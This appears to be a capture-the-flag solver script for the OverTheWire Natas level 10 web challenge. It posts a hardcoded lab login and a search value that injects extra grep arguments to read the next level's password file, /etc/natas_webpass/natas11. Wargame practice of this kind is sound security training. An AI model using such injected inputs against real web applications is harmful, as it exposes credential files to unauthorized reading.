#!/bin/python3
import requests
import base64
import binascii
import html
from bs4 import BeautifulSoup


username = "natas10"
password = "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"

r = requests.post('http://natas10.natas.labs.overthewire.org', auth=(username, password), data={"needle":"w /etc/natas_webpass/natas11", "submit":"submit"})
soup = BeautifulSoup(r.text, "html.parser")
text = soup.find("span").string
print(text)
#print(r.text)
#encoded = encoded[::-1]
#encoded = encoded.hex()
#encoded = str(bin(int(encoded, 16)))
#print(encoded)
#print(r.cookies['loggedIn'])
